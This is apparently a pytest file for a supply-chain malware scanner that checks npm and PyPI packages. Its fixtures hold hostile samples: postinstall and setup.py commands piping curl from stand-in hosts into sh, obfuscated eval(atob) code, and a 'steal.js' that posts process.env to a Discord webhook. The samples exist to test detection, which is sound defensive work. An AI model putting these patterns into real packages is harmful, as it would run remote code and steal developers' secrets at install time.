"""Tests for the supply-chain static scanners (manifest + content) and that a
malicious npm/PyPI-style repo now CONFIRMS in Tier-2 (the recall fix, P2)."""

from __future__ import annotations

import json

from git_warden.scanning.content_scanner import scan_content
from git_warden.scanning.manifest_scanner import scan_manifests
from git_warden.scanning.tier2 import analyze_repo


def test_manifest_flags_malicious_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "evil", "scripts": {"postinstall": "curl http://evil.tld/x | sh"}}),
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" and f.rule == "npm-postinstall" for f in findings)


def test_manifest_ignores_benign_postinstall(tmp_path):
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "ok", "scripts": {"postinstall": "node-gyp rebuild"}}),
        encoding="utf-8",
    )
    assert scan_manifests(tmp_path) == []  # no suspicious command -> no flag


def test_manifest_flags_setup_py_exec(tmp_path):
    (tmp_path / "setup.py").write_text(
        "from setuptools import setup\nimport os\nos.system('curl http://evil|sh')\nsetup()\n",
        encoding="utf-8",
    )
    findings = scan_manifests(tmp_path)
    assert any(f.category == "install_hook" for f in findings)


def test_content_flags_obfuscated_js(tmp_path):
    (tmp_path / "index.js").write_text(
        "const p = eval(atob('Y29uc29sZQ=='));\n"
        "require('child_process').exec('id');\n"
        "fetch('https://discord.com/api/webhooks/1/abc', {method:'POST'});\n",
        encoding="utf-8",
    )
    cats = {f.category for f in scan_content(tmp_path)}
    assert "obfuscation" in cats
    assert "code_execution" in cats
    assert "network_exfil" in cats


def test_malicious_npm_repo_confirms_in_tier2(tmp_path):
    # The whole point: a JS supply-chain repo (no bash) now confirms.
    (tmp_path / "package.json").write_text(
        json.dumps({"name": "stealer", "scripts": {"postinstall": "node steal.js"}}),
        encoding="utf-8",
    )
    (tmp_path / "steal.js").write_text(
        "const d = eval(atob('eA=='));\n"
        "fetch('https://discord.com/api/webhooks/9/z', "
        "{method:'POST', body: JSON.stringify(process.env)});\n",
        encoding="utf-8",
    )
    result = analyze_repo(tmp_path, "evil/stealer")
    assert result.confirmed
    assert result.bash_score >= 5
    assert any(f.category == "network_exfil" for f in result.bash_findings)


def test_clean_js_repo_not_confirmed(tmp_path):
    (tmp_path / "index.js").write_text(
        "export function add(a, b) { return a + b; }\n", encoding="utf-8"
    )
    assert not analyze_repo(tmp_path, "good/lib").confirmed


def test_run_external_guarddog_flags_on_issues(monkeypatch, tmp_path):
    import git_warden.scanning.tier2 as t2
    (tmp_path / "package.json").write_text("{}", encoding="utf-8")
    monkeypatch.setattr(t2.shutil, "which", lambda n: "/usr/bin/" + n)

    def runner(cmd, **k):
        class R:
            returncode = 0
            stdout = json.dumps({"issues": 2, "results": {"exfiltration": ["x"]}})
            stderr = ""
        return R()

    assert t2._run_external("guarddog", tmp_path, runner) == "flagged"
